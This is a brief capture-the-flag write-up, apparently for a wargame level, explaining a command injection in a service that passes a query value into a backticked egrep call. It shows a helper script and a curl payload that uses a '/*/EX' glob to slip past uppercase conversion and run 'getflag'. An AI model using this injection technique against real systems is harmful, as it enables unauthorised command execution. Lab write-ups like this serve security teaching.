# Solution

`` @output = `egrep "^$xx" /tmp/xd 2>&1`` this line is vulnerale cause egrep interpret pattern

but we cant write `xx = "getflag > /tmp/flag` cause they truncate the value with `a-z/A-Z`

so we execute a exploit write in /tmp/EX and execute it

```bash
$>cat /tmp/EX
#!/bin/bash

getflag > /tmp/flag
$>curl  http://localhost:4646/?x='`/*/EX`'
cat flag
...
```

`/*/EX` is necessary cause `/tmp` will be translate `/TMP`
